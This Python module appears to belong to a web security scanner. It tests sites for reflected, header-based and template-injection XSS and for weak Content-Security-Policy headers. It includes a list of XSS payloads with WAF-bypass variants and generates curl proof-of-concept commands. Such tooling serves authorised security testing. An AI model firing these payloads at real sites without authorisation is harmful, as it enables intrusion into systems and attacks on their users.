"""
EVHunter — XSS Analyzer Module  v1.0
Tests for Reflected, Stored, and DOM-based Cross-Site Scripting.

Detection techniques:
  - Reflection detection with marker probe → targeted payload testing
  - HTML / attribute / JavaScript / URL context identification
  - HTTP header injection (User-Agent, Referer, X-Forwarded-For)
  - CSP header presence and weakness analysis
  - Template injection probe (Angular, Vue, Jinja2)
  - Form field reflection testing (GET & POST)
  - WAF bypass payloads (case variation, encoding, event handler swap)
"""

import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Optional

from rich.console import Console
from rich.table import Table
from rich import box

from .base import ScannerModule

console = Console()

# ── Payloads ──────────────────────────────────────────────────────────────────

# Unique marker injected first to confirm reflection before testing real payloads
_MARKER = "EVHXSS9x8z"

# Context-aware XSS payloads
XSS_PAYLOADS: list[tuple[str, str]] = [
    # (payload, label)
    # ── HTML context ──────────────────────────────────────────────────────────
    ('<script>alert(1)</script>',              "html-script"),
    ('<img src=x onerror=alert(1)>',           "html-img"),
    ('<svg onload=alert(1)>',                  "html-svg"),
    ('<details open ontoggle=alert(1)>',       "html-details"),
    # ── Attribute break-out ───────────────────────────────────────────────────
    ('"><script>alert(1)</script>',            "attr-break-double"),
    ("'><script>alert(1)</script>",            "attr-break-single"),
    ('" onmouseover="alert(1)" x="',          "attr-event-double"),
    ("' onmouseover='alert(1)' x='",          "attr-event-single"),
    # ── JS context ────────────────────────────────────────────────────────────
    ("</script><script>alert(1)</script>",     "js-close"),
    ("';alert(1)//",                           "js-string-single"),
    ('";alert(1)//',                           "js-string-double"),
    ("`);alert(1)//`",                         "js-template-literal"),
    # ── WAF bypass (case / encoding) ──────────────────────────────────────────
    ("<ScRiPt>alert(1)</ScRiPt>",              "bypass-case"),
    ("<svg/onload=alert(1)>",                  "bypass-nospace"),
    ("<img src=x oNeRrOr=alert(1)>",          "bypass-case2"),
    ("%3Cscript%3Ealert(1)%3C/script%3E",     "bypass-urlencode"),
    # ── Template injection ────────────────────────────────────────────────────
    ("{{7*7}}",   "ssti-double-brace"),
    ("${7*7}",    "ssti-dollar"),
    ("#{7*7}",    "ssti-hash"),
]

# Headers to test for reflection
_TEST_HEADERS: list[tuple[str, str]] = [
    ("User-Agent",       f"<{_MARKER}>"),
    ("Referer",          f"https://example.com/<{_MARKER}>"),
    ("X-Forwarded-For",  f"<{_MARKER}>"),
    ("X-Original-URL",   f"/<{_MARKER}>"),
]

# Common parameter names to probe when a URL has no query string
_COMMON_PARAMS = [
    "q", "search", "s", "query", "keyword", "id", "name", "input",
    "value", "text", "message", "comment", "content", "data", "page",
    "url", "redirect", "next", "return", "ref", "callback", "jsonp",
    "term", "filter", "cat", "tag", "p", "msg", "note",
]

SEV_COLOR = {"critical": "bold red", "high": "red", "medium": "yellow", "low": "cyan"}


class XSSAnalyzerModule(ScannerModule):
    name        = "xss"
    description = "Cross-Site Scripting detection — reflected, DOM, header, template injection"

    # ── Public entry point ────────────────────────────────────────────────────

    def run(
        self,
        target: str,
        urls: list[str]         = None,
        forms: list[dict]       = None,
        crawler_params: dict    = None,
        alive_hosts: list[dict] = None,
        **kwargs,
    ) -> dict[str, Any]:
        self._start_timer()
        self._status(f"XSS analysis on [cyan]{target}[/cyan]…")

        base_url  = target if target.startswith("http") else f"https://{target}"
        test_urls = list(dict.fromkeys(urls or [base_url]))[:20]

        result: dict[str, Any] = {
            "ok":              True,
            "target":          target,
            "vulnerabilities": [],
            "summary":         "",
        }

        # 1. Test URL parameters (probe + reflect)
        for url in test_urls:
            self._test_url_params(url, result)

        # 2. Test form fields
        for form in (forms or [])[:20]:
            self._test_form(form, result)

        # 3. Test HTTP request headers
        self._test_header_xss(base_url, result)

        # 4. Test crawler-discovered params
        for url, params in (crawler_params or {}).items():
            for param in params:
                if not self._already_found(url, param, result):
                    self._test_single_param(url, param, result)

        # 5. CSP header analysis
        self._check_csp(base_url, result)

        # Deduplicate
        result["vulnerabilities"] = self._dedup(result["vulnerabilities"])

        n = len(result["vulnerabilities"])
        result["summary"] = (
            f"Found {n} XSS vulnerability(ies)" if n
            else "No XSS vulnerabilities detected"
        )
        self._ok(f"XSS analysis done — [bold {'red' if n else 'green'}]{n}[/bold {'red' if n else 'green'}] issue(s) [{self._elapsed()}]")
        self._print_table(result)
        return result

    # ── URL parameter testing ─────────────────────────────────────────────────

    def _test_url_params(self, url: str, result: dict):
        parsed  = urllib.parse.urlparse(url)
        params  = list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

        if not params:
            # Probe common names silently — check reflection marker only
            for param in _COMMON_PARAMS[:12]:
                probe_url = self._build_url(url, {param: _MARKER})
                resp = self._fetch(probe_url)
                if resp and _MARKER in resp["body"]:
                    self._test_single_param(url, param, result)
            return

        for param in params:
            self._test_single_param(url, param, result)

    def _test_single_param(self, url: str, param: str, result: dict):
        if self._already_found(url, param, result):
            return

        # Step 1: confirm reflection with marker (saves requests)
        probe_url = self._build_url(url, {param: _MARKER})
        probe_resp = self._fetch(probe_url)
        if not probe_resp or _MARKER not in probe_resp["body"]:
            return  # Parameter not reflected at all

        # Step 2: test actual XSS payloads
        for payload, label in XSS_PAYLOADS:
            test_url = self._build_url(url, {param: payload})
            resp     = self._fetch(test_url)
            if not resp:
                continue

            # Template injection: check for arithmetic result
            if label.startswith("ssti"):
                if "49" in resp["body"]:
                    result["vulnerabilities"].append(self._make_finding(
                        vuln_type = "Template Injection (SSTI)",
                        url=url, param=param, payload=payload,
                        severity="critical",
                        detail=f"Parameter '{param}' evaluates template expression — potential RCE",
                        curl_poc=f"curl -sk '{test_url}'",
                    ))
                    return
                continue

            if self._is_unescaped(payload, resp["body"]):
                ctx = self._detect_context(payload, resp["body"])
                result["vulnerabilities"].append(self._make_finding(
                    vuln_type = f"Reflected XSS ({ctx} context)",
                    url=url, param=param, payload=payload,
                    severity="high",
                    detail=f"Parameter '{param}' reflects unescaped input in {ctx} context ({label})",
                    curl_poc=f"curl -sk '{self._build_url(url, {param: payload})}'",
                ))
                return  # one vuln per param is enough

    # ── Form testing ──────────────────────────────────────────────────────────

    def _test_form(self, form: dict, result: dict):
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        if not action or not inputs:
            return

        for input_name in inputs[:6]:
            if self._already_found(action, input_name, result):
                continue

            # Reflection probe
            data = {i: "test" for i in inputs}
            data[input_name] = _MARKER
            probe_resp = (
                self._post(action, data) if method == "POST"
                else self._fetch(self._build_url(action, data))
            )
            if not probe_resp or _MARKER not in probe_resp["body"]:
                continue

            # Payload testing
            for payload, label in XSS_PAYLOADS[:10]:
                data[input_name] = payload
                resp = (
                    self._post(action, data) if method == "POST"
                    else self._fetch(self._build_url(action, data))
                )
                if resp and self._is_unescaped(payload, resp["body"]):
                    ctx = self._detect_context(payload, resp["body"])
                    result["vulnerabilities"].append(self._make_finding(
                        vuln_type=f"Reflected XSS — Form ({ctx}, {method})",
                        url=action, param=input_name, payload=payload,
                        severity="high",
                        detail=f"Form field '{input_name}' reflects XSS payload in {ctx} context",
                        curl_poc=(
                            f"curl -sk -X POST '{action}' "
                            f"-d '{input_name}={urllib.parse.quote(payload)}'"
                            if method == "POST"
                            else f"curl -sk '{self._build_url(action, {input_name: payload})}'"
                        ),
                    ))
                    break

    # ── Header-based XSS ──────────────────────────────────────────────────────

    def _test_header_xss(self, url: str, result: dict):
        for header, probe in _TEST_HEADERS:
            resp = self._fetch(url, extra_headers={header: probe})
            if resp and _MARKER in resp["body"]:
                xss_payload = probe.replace(_MARKER, "script>alert(1)</script")
                result["vulnerabilities"].append(self._make_finding(
                    vuln_type=f"Header-based XSS ({header})",
                    url=url, param=header, payload=probe,
                    severity="medium",
                    detail=f"HTTP header '{header}' is reflected unescaped — XSS via header injection",
                    curl_poc=f"curl -sk -H '{header}: <script>alert(1)</script>' '{url}'",
                ))

    # ── CSP analysis ──────────────────────────────────────────────────────────

    def _check_csp(self, url: str, result: dict):
        resp = self._fetch(url)
        if not resp:
            return
        csp = resp.get("headers", {}).get("content-security-policy", "")
        if not csp:
            result["vulnerabilities"].append(self._make_finding(
                vuln_type="Missing Content-Security-Policy",
                url=url, param="(header)", payload="N/A",
                severity="medium",
                detail="No CSP header — XSS exploitation is unrestricted",
                curl_poc=f"curl -sk -I '{url}' | grep -i content-security",
            ))
        else:
            weak = []
            if "'unsafe-inline'" in csp:
                weak.append("unsafe-inline")
            if "'unsafe-eval'" in csp:
                weak.append("unsafe-eval")
            if weak:
                result["vulnerabilities"].append(self._make_finding(
                    vuln_type="Weak CSP",
                    url=url, param="(header)", payload="N/A",
                    severity="low",
                    detail=f"CSP contains weak directives: {', '.join(weak)} — inline scripts allowed",
                    curl_poc=f"curl -sk -I '{url}' | grep -i content-security",
                ))

    # ── Helpers ───────────────────────────────────────────────────────────────

    @staticmethod
    def _make_finding(*, vuln_type, url, param, payload, severity, detail, curl_poc) -> dict:
        return {
            "type":     vuln_type,
            "url":      url,
            "param":    param,
            "payload":  payload,
            "severity": severity,
            "detail":   detail,
            "curl_poc": curl_poc,
        }

    @staticmethod
    def _is_unescaped(payload: str, body: str) -> bool:
        """Return True if key injection chars appear unencoded in the body."""
        if not body:
            return False
        body_lower = body.lower()
        # Template injection
        if "{{7*7}}" in payload and "49" in body:
            return True
        if "${7*7}" in payload and "49" in body:
            return True
        # Detect key dangerous tokens unencoded
        danger_tokens = [
            ("<script", "alert("),
            ("<img",     "onerror="),
            ("<svg",     "onload="),
            ("<details", "ontoggle="),
            ("onerror=", "onerror="),
            ("onload=",  "onload="),
            ("onmouseover=", "onmouseover="),
        ]
        for tok_in_payload, tok_in_body in danger_tokens:
            if tok_in_payload.lower() in payload.lower() and tok_in_body.lower() in body_lower:
                # Make sure it is NOT HTML-encoded in the response
                encoded = tok_in_body.replace("<", "&lt;").replace(">", "&gt;")
                if encoded.lower() not in body_lower:
                    return True
        # URL-encoded bypass: payload is encoded but body decodes it
        if "%3cscript%3e" in payload.lower() and "<script" in body_lower:
            return True
        return False

    @staticmethod
    def _detect_context(payload: str, body: str) -> str:
        pl = payload[:15].lower()
        idx = body.lower().find(pl)
        if idx == -1:
            return "html"
        surrounding = body[max(0, idx - 60): idx + len(payload) + 60]
        if re.search(r"<script[^>]*>", surrounding, re.I):
            return "javascript"
        if re.search(r'(?:href|src|action)\s*=\s*["\']', surrounding, re.I):
            return "url-attribute"
        if re.search(r'=\s*["\']', surrounding, re.I):
            return "attribute"
        return "html"

    @staticmethod
    def _build_url(url: str, params: dict) -> str:
        parsed   = urllib.parse.urlparse(url)
        existing = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        merged   = {k: v[0] if isinstance(v, list) else v for k, v in existing.items()}
        merged.update(params)
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(merged)))

    def _fetch(self, url: str, extra_headers: dict = None) -> Optional[dict]:
        try:
            hdrs = {
                "User-Agent": "Mozilla/5.0 (compatible; EVHunter/3.0)",
                "Accept":     "text/html,*/*",
            }
            if extra_headers:
                hdrs.update(extra_headers)
            req = urllib.request.Request(url, headers=hdrs)
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body    = resp.read(200_000).decode("utf-8", errors="replace")
                headers = {k.lower(): v for k, v in dict(resp.headers).items()}
                return {"status": resp.status, "body": body, "headers": headers}
        except urllib.error.HTTPError as e:
            body = e.read(8_000).decode("utf-8", errors="replace") if e.fp else ""
            return {"status": e.code, "body": body, "headers": {}}
        except Exception:
            return None

    def _post(self, url: str, data: dict) -> Optional[dict]:
        try:
            encoded = urllib.parse.urlencode(data).encode()
            req = urllib.request.Request(
                url, data=encoded,
                headers={
                    "User-Agent":   "Mozilla/5.0 (compatible; EVHunter/3.0)",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read(200_000).decode("utf-8", errors="replace")
                return {"status": resp.status, "body": body, "headers": {}}
        except urllib.error.HTTPError as e:
            body = e.read(8_000).decode("utf-8", errors="replace") if e.fp else ""
            return {"status": e.code, "body": body, "headers": {}}
        except Exception:
            return None

    @staticmethod
    def _already_found(url: str, param: str, result: dict) -> bool:
        return any(v["url"] == url and v["param"] == param for v in result["vulnerabilities"])

    @staticmethod
    def _dedup(vulns: list) -> list:
        seen, out = set(), []
        for v in vulns:
            key = f"{v['url']}|{v['param']}|{v['type']}"
            if key not in seen:
                seen.add(key)
                out.append(v)
        return out

    # ── Display ───────────────────────────────────────────────────────────────

    def _print_table(self, result: dict):
        vulns = result["vulnerabilities"]
        if not vulns:
            console.print("  [dim]  No XSS vulnerabilities found[/dim]")
            return
        tbl = Table(
            title=f"  [bold red]⚡ XSS Findings ({len(vulns)})[/bold red]",
            box=box.SIMPLE_HEAVY, header_style="bold cyan", border_style="bright_red",
        )
        tbl.add_column("Severity", width=10)
        tbl.add_column("Type",     max_width=35)
        tbl.add_column("Param",    max_width=20, style="cyan")
        tbl.add_column("URL",      max_width=45, style="dim")
        for v in vulns:
            sev   = v.get("severity", "high")
            color = SEV_COLOR.get(sev, "white")
            tbl.add_row(
                f"[{color}]{sev.upper()}[/{color}]",
                v.get("type", "?")[:35],
                v.get("param", "?")[:20],
                v.get("url", "?")[:45],
            )
        console.print(tbl)
